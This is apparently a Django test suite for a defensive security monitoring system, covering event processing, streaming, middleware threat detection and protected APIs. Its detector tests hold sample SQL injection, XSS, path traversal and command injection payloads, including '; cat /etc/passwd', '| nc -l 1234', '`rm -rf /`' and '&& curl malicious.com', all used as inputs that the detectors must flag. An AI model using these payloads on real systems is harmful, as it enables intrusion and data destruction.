"""
Phase 8: Advanced Monitoring & Response Systems - Test Suite
Comprehensive testing for real-time monitoring and event streaming

Author: ETH Blue Team Engineer
Created: 2025-11-15
Security Level: CRITICAL
Component: Testing & Validation
"""

import asyncio
import json
import time
import uuid
import threading
from datetime import datetime, timedelta
from unittest.mock import Mock, patch, AsyncMock
import pytest
from django.test import TestCase, RequestFactory, override_settings
from django.contrib.auth.models import User
from django.urls import reverse
from django.core.cache import cache

from security_enhancements.advanced_monitoring import (
    SecurityEvent, EventPriority, RealTimeSecurityMonitor,
    SecurityEventProcessor, AdvancedCorrelationEngine, IntelligentResponseEngine
)
from security_enhancements.event_streaming import (
    SecurityEventStreamer, StreamSubscription, SubscriptionType, EventBatch
)
from security_enhancements.monitoring_middleware import (
    SecurityMonitoringMiddleware, RequestTracker, ThreatDetector
)


class TestRealTimeSecurityMonitor(TestCase):
    """Test the real-time security monitoring engine"""
    
    def setUp(self):
        self.monitor = RealTimeSecurityMonitor()
        
    def test_monitor_initialization(self):
        """Test monitor initialization"""
        self.assertIsNotNone(self.monitor)
        self.assertIsNotNone(self.monitor.event_queue)
        self.assertTrue(hasattr(self.monitor, 'processors'))
        self.assertTrue(hasattr(self.monitor, 'correlation_engine'))
        
    def test_event_processing(self):
        """Test event processing workflow"""
        # Create test event
        event = SecurityEvent(
            event_type="TEST_EVENT",
            severity=3,
            source="test_source",
            destination="test_destination",
            description="Test event for monitoring",
            priority=EventPriority.NORMAL
        )
        
        # Process event
        self.monitor.process_event(event)
        
        # Verify event was queued
        self.assertGreater(self.monitor.metrics['total_events_processed'], 0)
        
    def test_event_queue_capacity(self):
        """Test event queue capacity management"""
        initial_count = self.monitor.metrics['total_events_processed']
        
        # Fill queue with events
        for i in range(100):
            event = SecurityEvent(
                event_type=f"BULK_TEST_{i}",
                severity=2,
                source=f"source_{i}",
                destination="test_dest",
                description=f"Bulk test event {i}",
                priority=EventPriority.LOW
            )
            self.monitor.process_event(event)
        
        # Allow processing time
        time.sleep(0.5)
        
        # Verify events were processed
        self.assertGreater(
            self.monitor.metrics['total_events_processed'],
            initial_count + 50  # At least some events processed
        )
        
    def test_correlation_engine(self):
        """Test event correlation functionality"""
        correlation_engine = self.monitor.correlation_engine
        
        # Create related events
        events = []
        base_time = datetime.now()
        
        for i in range(5):
            event = SecurityEvent(
                event_type="AUTHENTICATION_FAILURE",
                severity=3,
                source="192.168.1.100",
                destination="app_server",
                description=f"Failed login attempt #{i}",
                priority=EventPriority.NORMAL,
                timestamp=base_time + timedelta(seconds=i)
            )
            events.append(event)
        
        # Test correlation
        correlations = correlation_engine.correlate_events(events)
        
        # Verify correlations were found
        self.assertIsInstance(correlations, list)
        if correlations:
            self.assertTrue(any('brute_force' in str(corr).lower() for corr in correlations))
            
    def test_response_engine(self):
        """Test automated response functionality"""
        response_engine = self.monitor.response_engine
        
        # Create high-severity event
        event = SecurityEvent(
            event_type="MALWARE_DETECTED",
            severity=5,
            source="infected_host",
            destination="critical_server",
            description="Malware detected on critical system",
            priority=EventPriority.CRITICAL
        )
        
        # Test response generation
        responses = response_engine.generate_responses(event, [])
        
        # Verify responses were generated
        self.assertIsInstance(responses, list)
        self.assertGreater(len(responses), 0)
        
    def test_performance_metrics(self):
        """Test performance metrics collection"""
        # Process events and check metrics
        for i in range(10):
            event = SecurityEvent(
                event_type="PERFORMANCE_TEST",
                severity=1,
                source="test",
                destination="test",
                description="Performance test event"
            )
            self.monitor.process_event(event)
        
        # Allow processing
        time.sleep(0.2)
        
        # Check metrics
        metrics = self.monitor.get_performance_metrics()
        self.assertIn('events_per_second', metrics)
        self.assertIn('processing_latency_ms', metrics)
        self.assertIn('memory_usage_mb', metrics)


class TestSecurityEventStreamer(TestCase):
    """Test the event streaming system"""
    
    def setUp(self):
        self.streamer = SecurityEventStreamer(port=8766)  # Different port for testing
        
    def test_streamer_initialization(self):
        """Test streamer initialization"""
        self.assertEqual(self.streamer.port, 8766)
        self.assertIsNotNone(self.streamer.subscriptions)
        self.assertIsNotNone(self.streamer.event_buffer)
        
    def test_subscription_management(self):
        """Test subscription creation and management"""
        # Create mock websocket
        mock_websocket = Mock()
        
        # Create subscription
        subscription = StreamSubscription(
            client_id="test_client",
            subscription_type=SubscriptionType.HIGH_PRIORITY,
            websocket=mock_websocket
        )
        
        # Add to streamer
        self.streamer.subscriptions["test_client"] = subscription
        
        # Verify subscription
        self.assertIn("test_client", self.streamer.subscriptions)
        self.assertEqual(
            self.streamer.subscriptions["test_client"].subscription_type,
            SubscriptionType.HIGH_PRIORITY
        )
        
    async def test_event_streaming(self):
        """Test event streaming to subscribers"""
        # Create mock websocket
        mock_websocket = AsyncMock()
        
        # Create subscription
        subscription = StreamSubscription(
            client_id="test_client",
            subscription_type=SubscriptionType.ALL_EVENTS,
            websocket=mock_websocket
        )
        
        self.streamer.subscriptions["test_client"] = subscription
        
        # Create test event
        event = SecurityEvent(
            event_type="STREAM_TEST",
            severity=3,
            source="test_source",
            destination="test_dest",
            description="Test streaming event"
        )
        
        # Stream event
        await self.streamer.stream_event(event)
        
        # Verify websocket was called
        mock_websocket.send.assert_called()
        
    def test_event_filtering(self):
        """Test event filtering based on subscription"""
        # Create subscription with filters
        subscription = StreamSubscription(
            client_id="filtered_client",
            subscription_type=SubscriptionType.CUSTOM_FILTER,
            filters={
                'severity_min': 3,
                'event_types': ['SECURITY_ALERT', 'INTRUSION_DETECTED']
            }
        )
        
        # Test matching event
        matching_event = SecurityEvent(
            event_type="SECURITY_ALERT",
            severity=4,
            source="test",
            destination="test",
            description="High severity security alert"
        )
        
        # Test non-matching event
        non_matching_event = SecurityEvent(
            event_type="INFO_LOG",
            severity=1,
            source="test",
            destination="test", 
            description="Low severity info log"
        )
        
        # Test filtering
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        matches_filter = loop.run_until_complete(
            self.streamer._event_matches_subscription(matching_event, subscription)
        )
        
        no_match = loop.run_until_complete(
            self.streamer._event_matches_subscription(non_matching_event, subscription)
        )
        
        self.assertTrue(matches_filter)
        self.assertFalse(no_match)
        
    def test_event_batching(self):
        """Test event batching functionality"""
        # Create events for batching
        events = []
        for i in range(15):
            event = SecurityEvent(
                event_type=f"BATCH_TEST_{i}",
                severity=2,
                source="batch_source",
                destination="batch_dest",
                description=f"Batch test event {i}"
            )
            events.append(event)
        
        # Create batch
        batch = EventBatch(events=events[:10])
        
        # Verify batch properties
        self.assertEqual(len(batch.events), 10)
        self.assertIsNotNone(batch.batch_id)
        self.assertIsInstance(batch.created_at, datetime)
        
    def test_streaming_metrics(self):
        """Test streaming metrics collection"""
        # Add some test events to buffer
        for i in range(5):
            event = SecurityEvent(
                event_type="METRICS_TEST",
                severity=1,
                source="test",
                destination="test",
                description="Metrics test event"
            )
            self.streamer.event_buffer.append(event)
        
        # Get status
        status = self.streamer.get_streaming_status()
        
        # Verify status structure
        self.assertIn('status', status)
        self.assertIn('buffer_size', status)
        self.assertIn('metrics', status)
        self.assertIn('active_subscriptions', status)


class TestSecurityMonitoringMiddleware(TestCase):
    """Test the security monitoring middleware"""
    
    def setUp(self):
        self.factory = RequestFactory()
        
        # Create mock get_response
        def mock_get_response(request):
            from django.http import JsonResponse
            return JsonResponse({'status': 'ok'})
        
        self.middleware = SecurityMonitoringMiddleware(mock_get_response)
        
    def test_middleware_initialization(self):
        """Test middleware initialization"""
        self.assertIsNotNone(self.middleware)
        self.assertIsNotNone(self.middleware.request_tracker)
        self.assertIsNotNone(self.middleware.threat_detector)
        
    def test_request_analysis(self):
        """Test request security analysis"""
        # Create test request
        request = self.factory.get('/test/', {'param': 'value'})
        request.META['REMOTE_ADDR'] = '192.168.1.100'
        request.META['HTTP_USER_AGENT'] = 'Mozilla/5.0 (compatible; TestBot/1.0)'
        
        # Analyze request
        context = self.middleware._analyze_request_security(request, 'test_id')
        
        # Verify analysis result
        self.assertIn('request_id', context)
        self.assertIn('threats_detected', context)
        self.assertIn('risk_score', context)
        self.assertIsInstance(context['threats_detected'], list)
        
    def test_sql_injection_detection(self):
        """Test SQL injection detection"""
        # Create request with SQL injection attempt
        request = self.factory.get('/test/', {
            'id': "1' OR '1'='1",
            'search': 'test UNION SELECT * FROM users'
        })
        request.META['REMOTE_ADDR'] = '192.168.1.100'
        
        # Analyze request
        context = self.middleware._analyze_request_security(request, 'sql_test')
        
        # Should detect SQL injection
        self.assertTrue(any('SQL_INJECTION' in threat for threat in context['threats_detected']))
        
    def test_xss_detection(self):
        """Test XSS detection"""
        # Create request with XSS attempt
        request = self.factory.post('/test/', {
            'comment': '<script>alert("xss")</script>',
            'title': '<img src="x" onerror="alert(1)">'
        })
        request.META['REMOTE_ADDR'] = '192.168.1.100'
        
        # Analyze request
        context = self.middleware._analyze_request_security(request, 'xss_test')
        
        # Should detect XSS
        self.assertTrue(any('XSS' in threat for threat in context['threats_detected']))
        
    def test_rate_limiting(self):
        """Test rate limiting functionality"""
        client_ip = '192.168.1.200'
        
        # Test multiple requests from same IP
        results = []
        for i in range(5):
            result = self.middleware.request_tracker.check_rate_limit(client_ip, 3)
            results.append(result)
        
        # Should eventually exceed rate limit
        exceeded_results = [r for r in results if r['exceeded']]
        self.assertGreater(len(exceeded_results), 0)
        
    def test_suspicious_user_agent_detection(self):
        """Test suspicious user agent detection"""
        # Create request with suspicious user agent
        request = self.factory.get('/test/')
        request.META['REMOTE_ADDR'] = '192.168.1.100'
        request.META['HTTP_USER_AGENT'] = 'sqlmap/1.0'
        
        # Analyze request
        context = self.middleware._analyze_request_security(request, 'ua_test')
        
        # Should detect suspicious user agent
        self.assertTrue(any('SUSPICIOUS_USER_AGENT' in threat for threat in context['threats_detected']))


class TestThreatDetector(TestCase):
    """Test the threat detection system"""
    
    def setUp(self):
        self.detector = ThreatDetector()
        self.factory = RequestFactory()
        
    def test_sql_injection_patterns(self):
        """Test SQL injection pattern detection"""
        # Test various SQL injection patterns
        sql_payloads = [
            "1' OR '1'='1",
            "1; DROP TABLE users--",
            "1 UNION SELECT * FROM passwords",
            "admin'--",
            "' OR 1=1#"
        ]
        
        for payload in sql_payloads:
            request = self.factory.get('/test/', {'id': payload})
            detected = self.detector.detect_sql_injection(request)
            self.assertGreater(len(detected), 0, f"Failed to detect SQL injection: {payload}")
            
    def test_xss_patterns(self):
        """Test XSS pattern detection"""
        # Test various XSS patterns
        xss_payloads = [
            '<script>alert("xss")</script>',
            '<img src="x" onerror="alert(1)">',
            'javascript:alert("xss")',
            '<iframe src="javascript:alert(1)"></iframe>',
            '<svg onload="alert(1)">'
        ]
        
        for payload in xss_payloads:
            request = self.factory.post('/test/', {'content': payload})
            detected = self.detector.detect_xss(request)
            self.assertGreater(len(detected), 0, f"Failed to detect XSS: {payload}")
            
    def test_path_traversal_detection(self):
        """Test path traversal detection"""
        # Test path traversal patterns
        traversal_paths = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
        ]
        
        for path in traversal_paths:
            request = self.factory.get(f'/test/{path}')
            detected = self.detector.detect_path_traversal(request)
            self.assertTrue(detected, f"Failed to detect path traversal: {path}")
            
    def test_command_injection_detection(self):
        """Test command injection detection"""
        # Test command injection patterns
        command_payloads = [
            '; cat /etc/passwd',
            '| nc -l 1234',
            '`rm -rf /`',
            '$(whoami)',
            '&& curl malicious.com'
        ]
        
        for payload in command_payloads:
            request = self.factory.post('/test/', {'cmd': payload})
            detected = self.detector.detect_command_injection(request)
            self.assertTrue(detected, f"Failed to detect command injection: {payload}")


class TestMonitoringAPIs(TestCase):
    """Test monitoring API endpoints"""
    
    def setUp(self):
        # Create test user with staff privileges
        self.staff_user = User.objects.create_user(
            username='security_admin',
            password='secure_password_123',
            is_staff=True
        )
        self.client.force_login(self.staff_user)
        
    def test_security_monitoring_api(self):
        """Test security monitoring API endpoint"""
        url = reverse('security_enhancements:security_management:monitoring_api')
        response = self.client.get(url)
        
        # Should return monitoring status
        self.assertEqual(response.status_code, 200)
        data = response.json()
        self.assertIn('monitoring', data)
        self.assertIn('streaming', data)
        
    def test_event_streaming_status(self):
        """Test event streaming status endpoint"""
        url = reverse('security_enhancements:security_management:streaming_status')
        response = self.client.get(url)
        
        # Should return streaming status
        self.assertEqual(response.status_code, 200)
        data = response.json()
        self.assertIn('status', data)
        
    def test_security_events_api(self):
        """Test security events API"""
        url = reverse('security_enhancements:security_management:security_events')
        response = self.client.get(url, {
            'limit': 10,
            'severity_min': 2
        })
        
        # Should return events data
        self.assertEqual(response.status_code, 200)
        data = response.json()
        self.assertIn('events', data)
        self.assertIn('total_count', data)
        
    def test_security_dashboard(self):
        """Test security dashboard endpoint"""
        url = reverse('security_enhancements:security_management:security_dashboard')
        response = self.client.get(url)
        
        # Should return dashboard data
        self.assertEqual(response.status_code, 200)
        data = response.json()
        self.assertIn('monitoring_status', data)
        self.assertIn('recent_events', data)
        
    def test_unauthorized_access(self):
        """Test unauthorized access to APIs"""
        # Logout user
        self.client.logout()
        
        # Try to access protected endpoint
        url = reverse('security_enhancements:security_management:monitoring_api')
        response = self.client.get(url)
        
        # Should be redirected or forbidden
        self.assertIn(response.status_code, [302, 401, 403])


class TestIntegrationWorkflow(TestCase):
    """Test complete monitoring workflow integration"""
    
    def setUp(self):
        self.monitor = RealTimeSecurityMonitor()
        self.streamer = SecurityEventStreamer(port=8767)
        
    def test_end_to_end_workflow(self):
        """Test complete event processing workflow"""
        # Create test event
        event = SecurityEvent(
            event_type="INTEGRATION_TEST",
            severity=4,
            source="test_system",
            destination="target_system",
            description="End-to-end integration test event",
            priority=EventPriority.HIGH
        )
        
        # Process through monitor
        self.monitor.process_event(event)
        
        # Add to streamer buffer
        self.streamer.event_buffer.append(event)
        
        # Verify event was processed
        self.assertGreater(self.monitor.metrics['total_events_processed'], 0)
        self.assertGreater(len(self.streamer.event_buffer), 0)
        
        # Verify event is in streamer buffer
        buffered_event = self.streamer.event_buffer[-1]
        self.assertEqual(buffered_event.event_type, "INTEGRATION_TEST")
        self.assertEqual(buffered_event.severity, 4)


# Performance Tests
class TestPerformance(TestCase):
    """Performance testing for monitoring components"""
    
    def test_event_processing_throughput(self):
        """Test event processing throughput"""
        monitor = RealTimeSecurityMonitor()
        
        # Process large number of events
        start_time = time.time()
        event_count = 1000
        
        for i in range(event_count):
            event = SecurityEvent(
                event_type=f"PERF_TEST_{i}",
                severity=2,
                source="perf_source",
                destination="perf_dest",
                description=f"Performance test event {i}"
            )
            monitor.process_event(event)
        
        # Allow processing time
        time.sleep(2)
        
        end_time = time.time()
        processing_time = end_time - start_time
        
        # Calculate throughput
        throughput = event_count / processing_time
        
        # Should process at least 100 events per second
        self.assertGreater(throughput, 100, 
                         f"Throughput too low: {throughput:.2f} events/second")
        
    def test_memory_usage(self):
        """Test memory usage during processing"""
        import psutil
        import os
        
        process = psutil.Process(os.getpid())
        initial_memory = process.memory_info().rss / 1024 / 1024  # MB
        
        monitor = RealTimeSecurityMonitor()
        
        # Process events
        for i in range(5000):
            event = SecurityEvent(
                event_type="MEMORY_TEST",
                severity=1,
                source="mem_test",
                destination="mem_test",
                description="Memory usage test event"
            )
            monitor.process_event(event)
        
        # Allow processing
        time.sleep(1)
        
        final_memory = process.memory_info().rss / 1024 / 1024  # MB
        memory_increase = final_memory - initial_memory
        
        # Memory increase should be reasonable (less than 100MB for 5000 events)
        self.assertLess(memory_increase, 100, 
                       f"Memory usage too high: {memory_increase:.2f} MB increase")


if __name__ == '__main__':
    # Run tests
    import unittest
    unittest.main()